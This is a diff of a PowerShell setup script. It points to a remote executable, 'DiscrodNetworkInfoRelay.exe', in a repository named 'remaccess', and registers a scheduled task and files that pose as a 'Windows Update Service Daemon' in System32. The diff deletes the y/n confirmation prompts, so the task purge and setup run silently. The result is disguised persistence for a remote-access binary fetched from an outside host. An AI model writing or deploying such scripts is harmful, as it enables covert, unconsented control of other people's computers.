@@ -6,13 +6,6 @@ $filePaths = @("C:\Windows\System32\WindowsUpdateServiceDaemon.exe", "C:\Windows
 $url = "https://github.com/DirNotAvailable/remaccess/releases/download/v1.0.0/DiscrodNetworkInfoRelay.exe"
 $pingdaemontask = "Windows Update Service Daemon"
 #Purge of Ping Task
-$Name = "Deleteing the Ping Task and Related Files"
-$prompt = Read-Host "Proceed With $Name (y/n)"
-if ([string]::IsNullOrEmpty($pwdst)) {
-    Start-Sleep -Seconds 1
-    $pwdst = "n"
-}
-if ($prompt.ToLower() -eq "y") {
 if (Get-ScheduledTask -TaskName $pingdaemontask -ErrorAction SilentlyContinue) {
 Unregister-ScheduledTask -TaskName $pingdaemontask -Confirm:$false
 } else {}
@@ -23,13 +16,6 @@ foreach ($file in $filepath) {
     } else {}
 }} else {}
 #Creation of the setup
-$Name = "Creating a schedule task for Pinging"
-$prompt = Read-Host "Proceed With $Name (y/n)"
-if ([string]::IsNullOrEmpty($pwdst)) {
-    Start-Sleep -Seconds 1
-    $pwdst = "n"
-}
-if ($prompt.ToLower() -eq "y") {
 if (-not (Test-Path (Split-Path $localFilePath))) {
     New-Item -Path (Split-Path $localFilePath) -ItemType Directory -Force | Out-Null
 }
